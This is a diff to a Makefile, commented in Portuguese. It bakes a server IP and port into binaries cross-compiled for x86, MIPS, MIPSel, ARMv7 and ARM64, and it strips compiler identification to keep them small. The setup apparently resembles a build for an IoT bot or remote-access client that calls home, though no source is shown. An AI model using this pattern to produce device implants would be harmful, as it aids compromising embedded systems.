@@ -1,9 +1,17 @@
 # Configurações Gerais
+# IMPORTANTE: Definir o IP do servidor principal antes de compilar
+# Exemplo: make all SERVER_IP=123.456.789.0 SERVER_PORT=8443
+
+SERVER_IP ?= 0.0.0.0
+SERVER_PORT_NUM ?= 8443
+
 # -Os = otimiza para TAMANHO em vez de velocidade
 # -ffunction-sections -fdata-sections = separa cada função/dado em seção própria
 # -fno-asynchronous-unwind-tables = remove tabelas de unwind (exceções)
 # -fno-ident = remove identificação do compilador
 CFLAGS = -Wall -Os -pthread -D_GNU_SOURCE \
+         -DSERVER_HOST=\"$(SERVER_IP)\" \
+         -DSERVER_PORT=$(SERVER_PORT_NUM) \
          -ffunction-sections -fdata-sections \
          -fno-asynchronous-unwind-tables -fno-ident \
          -fomit-frame-pointer -fmerge-all-constants \
@@ -28,6 +36,10 @@ CC_ARM64   = aarch64-linux-gnu-gcc
 
 # Alvo padrão: compila para todos
 all: x86 mips mipsel armv7 arm64
+	@echo ""
+	@echo "================================================"
+	@echo " Compilado com SERVER_IP=$(SERVER_IP):$(SERVER_PORT_NUM)"
+	@echo "================================================"
 
 x86:
 	$(CC_X86) $(CFLAGS) $(SRCS) -o $(TARGET)_x64 $(LDFLAGS)
